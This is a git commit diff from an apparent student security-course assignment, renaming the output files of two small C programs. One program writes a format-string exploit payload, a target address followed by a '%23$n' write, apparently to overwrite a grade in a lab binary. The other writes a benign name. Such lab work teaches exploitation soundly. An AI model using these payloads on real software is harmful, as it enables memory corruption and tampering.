889b5c3140b7442a1a5b3b9f247155cb755c7d46
acharya8848 <anubhavacharya@icloud.com>
2022-10-07 00:09:28 -0400

    Made naming compliant with the requirements for the assignment.

--- HW4/B/format_string_attack.c
+++ HW4/B/format_string_attack.c
@@ -21,7 +21,7 @@
 
 int main(int argc, char *argv[]) {
 	char *buf = "\x2a\xa0\x04\x08                                                             %23$n\nAnubhav Acharya";
-	FILE *fp = fopen("input.txt", "wb");
+	FILE *fp = fopen("gradeA.txt", "wb");
 	fprintf(fp, "%s", buf);
 	fclose(fp);
 	return 0;
--- HW4/B/format_string_benign.c
+++ HW4/B/format_string_benign.c
@@ -2,7 +2,7 @@
 
 int main(int argc, char *argv[]) {
 	char *buf = "Anubhav Acharya\nAnubhav Acharya";
-	FILE *fp = fopen("input.txt", "wb");
+	FILE *fp = fopen("name.txt", "wb");
 	fprintf(fp, "%s", buf);
 	fclose(fp);
 	return 0;
